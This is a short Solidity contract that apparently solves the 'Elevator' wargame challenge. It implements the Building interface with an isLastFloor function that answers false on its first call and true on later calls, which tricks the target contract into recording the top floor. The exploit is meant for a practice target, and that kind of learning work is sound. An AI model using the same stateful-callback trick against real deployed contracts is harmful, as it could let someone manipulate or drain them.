// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorSolver is Building {
    bool called;

    function solveChallenge(address challenge) public {
        IElevator instance = IElevator(challenge);
        instance.goTo(0);
    }

    function isLastFloor(uint256) external override returns (bool v) {
        if (!called) {
            v = false;
        } else {
            v = true;
        }

        called = true;
        return v;
    }
}
